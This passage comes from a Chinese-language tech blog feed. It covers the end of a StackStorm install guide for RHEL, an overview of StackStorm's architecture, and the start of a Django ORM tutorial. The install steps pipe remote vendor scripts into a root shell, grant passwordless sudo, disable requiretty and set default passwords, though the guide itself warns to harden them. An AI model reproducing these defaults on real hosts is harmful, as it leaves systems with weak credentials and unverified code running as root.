$&#123;DATASTORE_ENCRYPTION_KEY_PATH&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> path to the key file <span class="keyword">in</span> the config</span></span><br><span class="line">sudo crudini --set /etc/st2/st2.conf keyvalue encryption_key_path $&#123;DATASTORE_ENCRYPTION_KEY_PATH&#125;</span><br><span class="line"></span><br><span class="line">sudo st2ctl restart-component st2api</span><br></pre></td></tr></table></figure>

<h3 id="设置Mistral数据库"><a href="#设置Mistral数据库" class="headerlink" title="设置Mistral数据库"></a>设置Mistral数据库</h3><p>运行以下命令以设置Mistral PostgreSQL数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Create Mistral DB <span class="keyword">in</span> PostgreSQL</span></span><br><span class="line">cat &lt;&lt; EHD | sudo -u postgres psql</span><br><span class="line">CREATE ROLE mistral WITH CREATEDB LOGIN ENCRYPTED PASSWORD 'StackStorm';</span><br><span class="line">CREATE DATABASE mistral OWNER mistral;</span><br><span class="line">EHD</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Setup Mistral DB tables, etc.</span></span><br><span class="line">/opt/stackstorm/mistral/bin/mistral-db-manage --config-file /etc/mistral/mistral.conf upgrade head</span><br><span class="line"><span class="meta">#</span><span class="bash"> Register mistral actions</span></span><br><span class="line">/opt/stackstorm/mistral/bin/mistral-db-manage --config-file /etc/mistral/mistral.conf populate | grep -v -e openstack -e keystone -e ironicclient</span><br></pre></td></tr></table></figure>

<h3 id="配置SSH和SUDO"><a href="#配置SSH和SUDO" class="headerlink" title="配置SSH和SUDO"></a>配置SSH和SUDO</h3><p>要运行本地和远程shell操作，StackStorm使用特殊系统用户（默认情况下<code>stanley</code>）。对于远程Linux操作，使用SSH。我们建议在所有远程主机上配置基于公钥的SSH访问。我们还建议配置对localhost的SSH访问以运行示例和测试。</p>
<ul>
<li>创建StackStorm系统用户，启用无密码sudo，并设置对“localhost”的ssh访问，以便可以在本地测试基于SSH的操作。您需要提升权限才能执行此操作：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Create an SSH system user (default `stanley` user may already exist)</span></span><br><span class="line">sudo useradd stanley</span><br><span class="line">sudo mkdir -p /home/stanley/.ssh</span><br><span class="line">sudo chmod 0700 /home/stanley/.ssh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Generate ssh keys</span></span><br><span class="line">sudo ssh-keygen -f /home/stanley/.ssh/stanley_rsa -P ""</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Authorize key-based access</span></span><br><span class="line">sudo sh -c 'cat /home/stanley/.ssh/stanley_rsa.pub &gt;&gt; /home/stanley/.ssh/authorized_keys'</span><br><span class="line">sudo chown -R stanley:stanley /home/stanley/.ssh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Enable passwordless sudo</span></span><br><span class="line">sudo sh -c 'echo "stanley    ALL=(ALL)       NOPASSWD: SETENV: ALL" &gt;&gt; /etc/sudoers.d/st2'</span><br><span class="line">sudo chmod 0440 /etc/sudoers.d/st2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Make sure `Defaults requiretty` is disabled <span class="keyword">in</span> `/etc/sudoers`</span></span><br><span class="line">sudo sed -i -r "s/^Defaults\s+\+?requiretty/# Defaults +requiretty/g" /etc/sudoers</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在远程主机上配置SSH访问并启用无密码sudo，StackStorm将通过SSH运行远程操作。使用上一步中生成的公钥，按照<a href="https://docs.stackstorm.com/install/config/config.html#config-configure-ssh" target="_blank" rel="noopener">配置SSH中</a>的说明进行<a href="https://docs.stackstorm.com/install/config/config.html#config-configure-ssh" target="_blank" rel="noopener">操作</a>。要控制Windows框，请为<a href="https://docs.stackstorm.com/install/config/winrm_runners.html" target="_blank" rel="noopener">Windows运行程序</a>配置访问权限 。</p>
</li>
<li><p>如果您使用的是其他用户或SSH密钥的路径，则需要在以下位置更改此部分<code>/etc/st2/st2.conf</code>：</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[system_user]</span><br><span class="line">user = stanley</span><br><span class="line">ssh_key_file = /home/stanley/.ssh/stanley_rsa</span><br></pre></td></tr></table></figure>

<h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><ul>
<li>启动服务：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo st2ctl start</span><br></pre></td></tr></table></figure>

<ul>
<li>注册传感器，规则和操作：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo st2ctl reload</span><br></pre></td></tr></table></figure>

<h3 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h3><p>以下命令将测试StackStorm安装。他们都应该成功完成：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">st2 --version</span><br><span class="line"></span><br><span class="line">st2 -h</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> List the actions from a <span class="string">'core'</span> pack</span></span><br><span class="line">st2 action list --pack=core</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Run a <span class="built_in">local</span> shell <span class="built_in">command</span></span></span><br><span class="line">st2 run core.local -- date -R</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> See the execution results</span></span><br><span class="line">st2 execution list</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Fire a remote comand via SSH (Requires passwordless SSH)</span></span><br><span class="line">st2 run core.remote hosts='localhost' -- uname -a</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Install a pack</span></span><br><span class="line">st2 pack install st2</span><br></pre></td></tr></table></figure>

<p>使用supervisor脚本管理StackStorm服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo st2ctl start|stop|status|restart|restart-component|reload|clean</span><br></pre></td></tr></table></figure>

<p>以愉快地使用StackStorm了。</p>
<p>但没有Web UI就没有乐趣，没有SSL或身份验证就没有安全感，没有ChatOps就没有乐趣，没有Extreme Workflow Composer就没钱了。继续阅读！</p>
<h2 id="配置验证"><a href="#配置验证" class="headerlink" title="配置验证"></a>配置验证</h2><p>为简单起见，参考部署使用基于文件的身份验证提供程序。请参阅 <a href="https://docs.stackstorm.com/authentication.html" target="_blank" rel="noopener">身份验证</a>以配置和使用PAM或LDAP身份验证后端。</p>
<p>要使用基于文件的提供程序设置身份验证：</p>
<ul>
<li>使用密码创建用户：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Install htpasswd utility <span class="keyword">if</span> you don<span class="string">'t have it</span></span></span><br><span class="line">sudo yum -y install httpd-tools</span><br><span class="line"><span class="meta">#</span><span class="bash"> Create a user record <span class="keyword">in</span> a password file.</span></span><br><span class="line">echo 'Ch@ngeMe' | sudo htpasswd -i /etc/st2/htpasswd st2admin</span><br></pre></td></tr></table></figure>

<ul>
<li>启用并配置身份验证<code>/etc/st2/st2.conf</code>：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[auth]</span><br><span class="line"><span class="meta">#</span><span class="bash"> ...</span></span><br><span class="line">enable = True</span><br><span class="line">backend = flat_file</span><br><span class="line">backend_kwargs = &#123;"file_path": "/etc/st2/htpasswd"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> ...</span></span><br></pre></td></tr></table></figure>

<ul>
<li>重启st2api服务：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo st2ctl restart-component st2api</span><br></pre></td></tr></table></figure>

<ul>
<li>验证，并检查它是否有效：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Login - you will be prompted <span class="keyword">for</span> password (default <span class="string">'Ch@ngeMe'</span>)</span></span><br><span class="line">st2 login st2admin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Check that it works</span></span><br><span class="line">st2 action list</span><br></pre></td></tr></table></figure>

<h2 id="安装WebUI并设置SSL终止"><a href="#安装WebUI并设置SSL终止" class="headerlink" title="安装WebUI并设置SSL终止"></a>安装WebUI并设置SSL终止</h2><p><a href="http://nginx.org/" target="_blank" rel="noopener">NGINX</a>用于提供WebUI静态文件，将HTTP重定向到HTTPS，提供SSL终止，以及反向代理st2auth和st2api API端点。要进行设置：安装 <code>st2web</code>和<code>nginx</code>包，生成证书或放置现有证书<code>/etc/ssl/st2</code>，并使用StackStorm提供的<a href="https://github.com/StackStorm/st2/tree/master/conf/nginx/st2.conf" target="_blank" rel="noopener">站点配置文件st2.conf</a>配置nginx </p>
<p>StackStorm依赖于Nginx版本&gt; = 1.7.5。RHEL在软件包存储库中有一个旧版本，因此您需要添加官方Nginx存储库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Add key and repo <span class="keyword">for</span> the latest stable nginx</span></span><br><span class="line">sudo rpm --import http://nginx.org/keys/nginx_signing.key</span><br><span class="line">sudo sh -c "cat &lt;&lt;EOT &gt; /etc/yum.repos.d/nginx.repo</span><br><span class="line">[nginx]</span><br><span class="line">name=nginx repo</span><br><span class="line">baseurl=http://nginx.org/packages/rhel/\\\$releasever/x86_64/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">EOT"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ensure that EPEL repo is not used <span class="keyword">for</span> nginx</span></span><br><span class="line">sudo sed -i 's/^\(enabled=1\)$/exclude=nginx\n\1/g' /etc/yum.repos.d/epel.repo</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Install nginx</span></span><br><span class="line">sudo yum install -y nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Install st2web</span></span><br><span class="line">sudo yum install -y st2web</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Generate a self-signed certificate or place your existing certificate under /etc/ssl/st2</span></span><br><span class="line">sudo mkdir -p /etc/ssl/st2</span><br><span class="line">sudo openssl req -x509 -newkey rsa:2048 -keyout /etc/ssl/st2/st2.key -out /etc/ssl/st2/st2.crt \</span><br><span class="line">-days 365 -nodes -subj "/C=US/ST=California/L=Palo Alto/O=StackStorm/OU=Information \</span><br><span class="line">Technology/CN=$(hostname)"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Copy and <span class="built_in">enable</span> the supplied nginx config file</span></span><br><span class="line">sudo cp /usr/share/doc/st2/conf/nginx/st2.conf /etc/nginx/conf.d/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Disable default_server configuration <span class="keyword">in</span> existing /etc/nginx/nginx.conf</span></span><br><span class="line">sudo sed -i 's/default_server//g' /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">sudo systemctl restart nginx</span><br><span class="line">sudo systemctl enable nginx</span><br></pre></td></tr></table></figure>

<p>如果修改nginx配置中的ports或url路径，请在st2web配置中进行相应的更改<code>/opt/stackstorm/static/webui/config.js</code></p>
<p>使用浏览器连接<code>https://${ST2_HOSTNAME}</code>并登录WebUI</p>
<p>如果您无法连接到Web浏览器，则可能需要更改默认防火墙设置。您可以使用以下命令执行此操作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-service=http --add-service=https</span><br><span class="line">firewall-cmd --zone=public --permanent --add-service=http --add-service=https</span><br></pre></td></tr></table></figure>

<p>这将允许入站HTTP（端口80）和HTTPS（端口443）流量，并使这些更改在重新启动后继续存在。</p>
<p>如果您尝试从框外访问API并且已根据这些说明配置了nginx，请使用<code>https://${EXTERNAL_IP}/api/v1/${REST_ENDPOINT}</code>。</p>
<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X GET -H  'Connection: keep-alive' -H  'User-Agent: manual/curl' -H  'Accept-Encoding: gzip, deflate' -H  'Accept: */*' -H  'X-Auth-Token: &lt;YOUR_TOKEN&gt;' https://1.2.3.4/api/v1/actions</span><br></pre></td></tr></table></figure>

<p>同样，您可以使用连接到auth REST端点<code>https://${EXTERNAL_IP}/auth/v1/${AUTH_ENDPOINT}</code>。</p>
<p>您可以通过向<code>--debug</code>CLI命令添加适当资源的选项来查看资源的实际REST端点。</p>
<p>例如，要查看获取操作的端点，请调用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">st2 --debug action list</span><br></pre></td></tr></table></figure>

<h2 id="设置ChatOps"><a href="#设置ChatOps" class="headerlink" title="设置ChatOps"></a>设置ChatOps</h2><p>如果您已经运行了Hubot实例，则可以安装<a href="https://github.com/StackStorm/hubot-stackstorm" target="_blank" rel="noopener">hubot-stackstorm插件</a>并配置StackStorm环境变量，如下所述。否则，启用<a href="https://docs.stackstorm.com/chatops/index.html" target="_blank" rel="noopener">StackStorm ChatOps</a>的最简单方法 是使用<a href="https://github.com/stackstorm/st2chatops/" target="_blank" rel="noopener">st2chatops</a>包。</p>
<ul>
<li>验证<code>chatops</code>是否已安装该包，并启用了通知规则：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Ensure chatops pack is <span class="keyword">in</span> place</span></span><br><span class="line">ls /opt/stackstorm/packs/chatops</span><br><span class="line"><span class="meta">#</span><span class="bash"> Create notification rule <span class="keyword">if</span> not yet enabled</span></span><br><span class="line">st2 rule get chatops.notify || st2 rule create /opt/stackstorm/packs/chatops/rules/notify_hubot.yaml</span><br></pre></td></tr></table></figure>

<ul>
<li>添加<a href="https://nodejs.org/en/download/package-manager/" target="_blank" rel="noopener">NodeJS v10存储库</a>：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -sL https://rpm.nodesource.com/setup_10.x | sudo -E bash -</span><br></pre></td></tr></table></figure>

<ul>
<li>安装<code>st2chatops</code>包：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y st2chatops</span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看并编辑<code>/opt/stackstorm/chatops/st2chatops.env</code>配置文件，将其指向StackStorm安装和您正在使用的聊天服务。您至少应该生成 <a href="https://docs.stackstorm.com/authentication.html#authentication-apikeys" target="_blank" rel="noopener">API密钥</a>并设置<code>ST2_API_KEY</code>变量。默认情况下<code>st2api</code>，<code>st2auth</code>预计它们位于同一主机上。如果不是这种情况，请更新<code>ST2_API</code>和<code>ST2_AUTH_URL</code>变量或只是指向正确的主机 <code>ST2_HOSTNAME</code>。</p>
<p>示例配置使用Slack。要进行此设置，请转到Slack Web管理界面，创建一个Bot，然后将身份验证令牌复制到<code>HUBOT_SLACK_TOKEN</code>。</p>
<p>如果您使用的是其他聊天服务，请在以下部分中设置相应的环境变量 ： <a href="https://github.com/slackhq/hubot-slack" target="_blank" rel="noopener">Slack</a>， <a href="https://github.com/hipchat/hubot-hipchat" target="_blank" rel="noopener">HipChat</a>，<a href="https://github.com/flowdock/hubot-flowdock" target="_blank" rel="noopener">Flowdock</a>， <a href="https://github.com/nandub/hubot-irc" target="_blank" rel="noopener">IRC</a>， <a href="https://github.com/loafoe/hubot-matteruser" target="_blank" rel="noopener">Mattermost</a>， <a href="https://github.com/RocketChat/hubot-rocketchat" target="_blank" rel="noopener">RocketChat</a>，<a href="https://github.com/markstory/hubot-xmpp" target="_blank" rel="noopener">XMPP</a>。<code>Chat service adapter settings``st2chatops.env</code></p>
</li>
<li><p>启动服务：</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start st2chatops</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Start st2chatops on boot</span></span><br><span class="line">sudo systemctl enable st2chatops</span><br></pre></td></tr></table></figure>

<ul>
<li>重新加载st2包以确保<code>chatops.notify</code>注册规则：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo st2ctl reload --register-all</span><br></pre></td></tr></table></figure>

<p>开始聊天吧！！！</p>
<h2 id="安全注意事项"><a href="#安全注意事项" class="headerlink" title="安全注意事项"></a>安全注意事项</h2><p>默认情况下，安装MongoDB，RabbitMQ和PostgreSQL时，它们会禁用身份验证或使用默认静态密码。因此，在安装这些服务之后，您应该配置它们并使用强大的随机生成的密码启用身份验证。</p>
<p><strong>注意：</strong>如果您使用StackStorm安装脚本，则会自动完成此操作。</p>
<p>为这些服务配置授权和密码超出了本文档的范围。有关更多信息，请参阅以下链接</p>
<ul>
<li>MongoDB的- <a href="https://docs.mongodb.com/manual/tutorial/enable-authentication/，https://docs.mongodb.com/manual/core/authorization/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/tutorial/enable-authentication/，https://docs.mongodb.com/manual/core/authorization/</a></li>
<li>RabbitMQ - <a href="https://www.rabbitmq.com/authentication.html" target="_blank" rel="noopener">https://www.rabbitmq.com/authentication.html</a></li>
<li>PostgreSQL - <a href="https://www.postgresql.org/docs/9.4/static/auth-methods.html" target="_blank" rel="noopener">https://www.postgresql.org/docs/9.4/static/auth-methods.html</a></li>
</ul>
<p>为这些组件启用身份验证后，还需要更新StackStorm服务以使用新设置。</p>
<p>这意味着编辑以下配置选项：</p>
<ol>
<li>StackStorm - <code>/etc/st2/st2.conf</code></li>
</ol>
<blockquote>
<ul>
<li><p><code>database.username</code> - MongoDB数据库用户名。</p>
</li>
<li><p><code>database.password</code> - MongoDB数据库密码。</p>
</li>
<li><p><code>messaging.url</code>- RabbitMQ传输网址（<code>amqp://&lt;username&gt;:&lt;password&gt;@&lt;hostname&gt;:5672</code>）</p>
</li>
</ul>
</blockquote>
<p>2，mistral - <code>/etc/mistral/mistral.conf</code></p>
<blockquote>
<ul>
<li><code>database.connection</code>- PostgreSQL数据库连接字符串（<code>postgresql+psycopg2://&lt;username&gt;:&lt;password&gt;@&lt;hostname&gt;/mistral</code>）</li>
<li><code>transport_url</code>- RabbitMQ传输网址（<code>rabbit://&lt;username&gt;:&lt;password&gt;@&lt;hostname&gt;:5672</code>）</li>
</ul>
</blockquote>
<p>此外，强烈建议您遵循以下最佳实践来运行网络服务：</p>
<ul>
<li>确保服务之间的通信已加密。为MongoDB，RabbitMQ和PostgreSQL启用SSL / TLS。</li>
<li>将服务配置为仅侦听localhost，并在需要时侦听内部IP地址。通常不需要StackStorm（MongoDB，RabbitMQ，PostgreSQL）使用的大多数服务在公共IP地址上可用。</li>
<li>配置防火墙并设置白名单。防火墙应仅允许那些需要访问这些服务的用户和系统进行访问。API和auth服务通常需要您的用户可访问，但其他相关服务（如MongoDB，RabbitMQ和PostgreSQL）则不需要。这些不应该由用户直接访问，并且只允许StackStorm组件与它们通信。</li>
<li>在可能的情况下，您还应该使用其他基于网络的隔离和安全功能，例如DMZ。</li>
</ul>
<p>上述步骤对于StackStorm组件在多个服务器上运行的分布式生产部署尤为重要。</p>
<h2 id="升级到Extreme-Workflow-Composer"><a href="#升级到Extreme-Workflow-Composer" class="headerlink" title="升级到Extreme Workflow Composer"></a>升级到Extreme Workflow Composer</h2><p>Extreme Workflow Composer将Workflow Designer（用于创建/编辑工作流的图形工具），RBAC和LDAP添加到StackStorm。它作为一组附加软件包部署在StackStorm之上。您将需要一个有效的Extreme Workflow Composer订阅和一个许可证密钥来访问Extreme Workflow Composer存储库。</p>
<p>要了解有关Extreme Workflow Composer的更多信息，请求报价或获取评估许可证，请访问<a href="https://stackstorm.com/features/#ewc/" target="_blank" rel="noopener">stackstorm.com/product</a>。</p>
<p>要安装Extreme Workflow Composer，请<code>${EWC_LICENSE_KEY}</code>在下面的命令中使用您在注册或购买时收到的密钥进行替换，然后运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Set up Extreme Workflow Composer repository access</span></span><br><span class="line">curl -s https://$&#123;EWC_LICENSE_KEY&#125;:@packagecloud.io/install/repositories/StackStorm/enterprise/script.rpm.sh | sudo bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> Install Extreme Workflow Composer</span></span><br><span class="line">sudo yum install -y bwc-enterprise</span><br><span class="line">sudo st2ctl restart</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>自动化</category>
        <category>Stackstorm</category>
      </categories>
      <tags>
        <tag>Stackstorm</tag>
      </tags>
  </entry>
  <entry>
    <title>Stackstorm的介绍与入门</title>
    <url>/articles/514c154e.html</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>一句话概况：stackstorm是一个事件驱动的自动化引擎。</strong></p>
<p>官方解释：StackStorm是一个功能强大的开源自动化平台，可将所有应用程序，服务和工作流程连接起来。 它具有可扩展性，灵活性, 设计中包含了对DevOps和ChatOps的热爱。它可以将您现有的基础架构和应用程序环境联系在一起，以便您可以更轻松地自动化操作该环境。它特别专注于针对事件采取行动。</p>
<p>主要用途：  </p>
<ul>
<li>便利的故障排除 - 触发由Nagios，Sensu，New Relic和其他监控系统捕获的系统故障，在物理节点、OpenStack或Amazon实例和应用程序组件上运行一系列诊断检查，并将结果发布到共享通信环境中，如HipChat或JIRA。</li>
<li>自动修复 - 识别和验证OpenStack计算节点上的硬件故障，正确排空实例并向管理员发送关于潜在停机时间的电子邮件，但如果出现任何问题 - 冻结工作流程并呼叫PagerDuty唤醒人员。</li>
<li>持续部署 - 与Jenkins一起构建和测试，配置新的AWS群集，基于NewRelic的应用程序性能数据，打开负载均衡器的一些流量，以及前滚或回滚。</li>
</ul>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://stackstorm.com/" target="_blank" rel="noopener">官网</a></p>
<a id="more"></a>

<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img src="/articles/514c154e/1.png" alt></p>
<p>主要组成角色：</p>
<ul>
<li><strong>传感器（Sensors）</strong>是用于分别接收或监视事件的入站或出站集成的Python插件。 当来自外部系统的事件发生并由传感器处理时，StackStorm触发器将发射到系统中。</li>
<li><strong>触发器（Triggers）</strong>是外部事件的StackStorm表示形式。 有通用触发器（例如定时器，webhooks）和集成触发器（例如，Sensu告警，JIRA问题更新）。 通过编写传感器插件可以定义新的触发器类型。</li>
<li><strong>动作（Actions）</strong>是StackStorm出站集成。 有通用动作（ssh，REST调用），集成（OpenStack，Docker，Puppet）或自定义操作。 动作是Python插件或任何脚本，通过添加几行元数据将其消耗到StackStorm中。 动作可以由用户通过CLI或API直接调用，或者作为规则和工作流程的一部分使用和调用。</li>
<li><strong>规则（Rules）</strong>将触发器映射到动作（或工作流），应用匹配条件并将触发器加载到动作输入中。</li>
<li><strong>工作流（Workflows）</strong>将动作拼接成“超级动作”，定义顺序，转换条件以及传递数据。 大多数自动化不止一步，因此需要多个动作。 工作流就像“原子”动作一样，可在Action库中使用，并且可以手动调用或由规则触发。</li>
<li><strong>包(Packs)</strong>是内容部署的单位。 它们通过对集成（触发器和动作）和自动化（规则和工作流）进行分组，简化了StackStorm可插拔内容的管理和共享。 StackStorm Exchange上有越来越多的包可用。 用户可以创建自己的包，在Github上共享它们，或者提交给StackStorm Exchange.</li>
<li><strong>审计跟踪（Audit Trail）</strong>记录并存储手动或自动操作执行的审计跟踪，并存储触发上下文和执行结果的全部细节。 它还被记录在审计日志中，用于集成外部日志记录和分析工具：LogStash，Splunk，statsd，syslog</li>
</ul>
<p>StackStorm是一种具有模块化架构的服务。它包括松散耦合的服务组件，这些组件通过消息总线进行通信，并且可以水平扩展以实现大规模自动化。StackStorm具有Web UI，CLI客户端，当然还有完整的REST API。我们还提供Python客户端绑定，以使开发人员的生活更轻松。</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>StackStorm通过包含sensors和actions的可扩展套件插入环境中。</p>
<ol>
<li>从各个服务系统通过push或pull的方式把event传给sensors, sensors会产生一个trigger</li>
<li>到规则配置中查询该trigger对应的动作或者工作流</li>
<li>将来自工作流的Action发送到消息队列（内置rabbitmq）中</li>
<li>Actions到达外部的系统后就执行相应的动作</li>
<li>日志和审计历史被推送到数据库进行存储（Mongodb）</li>
<li>处理后的结果被发送回规则引擎进行进一步处理</li>
</ol>
<p>备注：由于笔者是刚接触，未有实践经验，所以仅仅是根据官方文档直译，有不当之处欢迎大家一起纠正!</p>
]]></content>
      <categories>
        <category>自动化</category>
        <category>Stackstorm</category>
      </categories>
      <tags>
        <tag>Stackstorm</tag>
      </tags>
  </entry>
  <entry>
    <title>Django ORM模型详解</title>
    <url>/articles/2c7f73f3.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>Django框架后面对数据库的ORM操作已经帮我们做了，我们只需要在创建model时，按照框架定义创建即可。但定义的几种ORM操作有哪些区别和怎么去操作呢？本篇详细说明。</p>
<a id="more"></a>

<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#_*_coding:utf-8_*_</span></span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Colors</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    colors=models.CharField(max_length=<span class="number">10</span>) <span class="comment">#蓝色</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.colors</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ball</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    color=models.OneToOneField(<span class="string">"Colors"</span>)  <span class="comment">#与颜色表为一对一，颜色表为母表</span></span><br><span class="line">    description=models.CharField(max_length=<span class="number">10</span>) <span class="comment">#描述</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.description</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clothes</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    color=models.ForeignKey(<span class="string">"Colors"</span>)   <span class="comment">#与颜色表为外键，颜色表为母表</span></span><br><span class="line">    description=models.CharField(max_length=<span class="number">10</span>) <span class="comment">#描述</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.description   </span><br><span class="line">     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    name=models.CharField(max_length=<span class="number">10</span>)   <span class="comment">#姓名  </span></span><br><span class="line">    favor=models.ManyToManyField(<span class="string">'Colors'</span>)    <span class="comment">#与颜色表为多对多</span></span><br></pre></td></tr></table></figure>

<h2 id="表中体现"><a href="#表中体现" class="headerlink" title="表中体现"></a>表中体现</h2><p><strong>一对一：子表从母表中选出一条数据一一对应，母表中选出来一条就少一条，子表不可以再选择母表中已被选择的那条数据</strong></p>
<p><strong>一对多：子表从母表中选出一条数据一一对应，但母表的这条数据还可以被其他子表数据选择</strong></p>
<p><strong>共同点是在admin中添加数据的话，都会出现一个select选框，但只能单选，因为不论一对一还是一对多，自己都是“一”</strong></p>
<p><strong>多对多：会各自创建一张表，并在第三张表中记录对应关系。</strong></p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p><strong>一对一：一般用于某张表的补充，比如用户基本信息是一张表，但并非每一个用户都需要有登录的权限，不需要记录用户名和密码，此时，合理的做法就是新建一张记录登录信息的表，与用户信息进行一对一的关联，可以方便的从子表查询母表信息或反向查询</strong></p>
<p><strong>一对多（外键）：有很多的应用场景，比如每个员工归属于一个部门，那么就可以让员工表的部门字段与部门表进行一对多关联，可以查询到一个员工归属于哪个部门，也可反向查出某一部门有哪些员工</strong></p>
<p><strong>多对多：如很多公司，一台服务器可能会有多种用途，归属于多个产品线当中，那么服务器与产品线之间就可以做成对多对，多对多在A表添加manytomany字段或者从B表添加，效果一致</strong></p>
<h3 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h3><p><strong>查：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#子表查询母表,找到红球对应的颜色</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">print(models.Ball.objects.get(description=<span class="string">"红球"</span>).color.colors)  <span class="comment">#返回红，通过子表查询母表，写法："子表对象.母表表名的小写.母表字段名" ；通过Ball表查到description为"红球"，查找到对应colors</span></span><br><span class="line"><span class="comment">#写法2，反向从母表入手：</span></span><br><span class="line">print(models.Colors.objects.get(ball__description=<span class="string">"红球"</span>).colors) <span class="comment">#返回红，通过子表查询母表，但形式上是从母表对象自身直接获取字段，写法："母表.objects.get(子表名小写__子表字段="xxx").母表字段名" ；效果和上边完全一致，另一种形式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#母表查询子表，找到红色对应的球的名字</span></span><br><span class="line"><span class="comment">#写法1：</span></span><br><span class="line">print(models.Colors.objects.get(colors=<span class="string">"红"</span>).ball.description)  <span 